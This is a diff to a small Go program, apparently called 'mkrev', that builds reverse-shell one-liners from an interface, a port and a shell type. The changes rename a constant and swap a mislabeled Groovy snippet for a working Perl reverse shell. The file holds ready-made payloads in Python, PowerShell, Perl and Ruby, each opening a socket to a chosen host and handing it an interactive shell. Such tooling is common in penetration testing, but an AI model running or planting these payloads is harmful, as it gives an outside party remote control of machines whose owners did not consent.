@@ -7,24 +7,24 @@ import (
 )
 
 const (
-	py         string = "py"
+	// TODO: Add more variant (?)
+	python     string = "py"
 	bash       string = "bash"
 	netcat     string = "nc"
 	php        string = "php"
 	powershell string = "ps"
 	perl       string = "pl"
 	ruby       string = "rb"
-	all        string = "all"
 )
 
 func main() {
-	// Only work on linux
+
 	if len(os.Args) > 3 {
-		interfaces := os.Args[1] // python, bash, perl, ruby, php, powershell.
-		port := os.Args[2]       // interfaces
+		interfaces := os.Args[1]
+		port := os.Args[2]
 		shell := os.Args[3]
 		crafted := generateReverseShell(interfaces, port, shell)
-		fmt.Print(crafted)
+		fmt.Println(crafted)
 		return
 	}
 	fmt.Printf("Usage:\n\tmkrev [interface] [port] [shell]")
@@ -40,7 +40,7 @@ func generateReverseShell(interfaces, port, shell string) string {
 	}
 
 	switch shell {
-	case py:
+	case python:
 		return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`,
 			ip, port)
 	case bash:
@@ -52,9 +52,7 @@ func generateReverseShell(interfaces, port, shell string) string {
 	case powershell:
 		return fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port)
 	case perl:
-		return fmt.Sprintf(`r = Runtime.getRuntime()
-		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-		p.waitFor()`, ip, port)
+		return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, ip, port)
 	case ruby:
 		return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)
 	default:
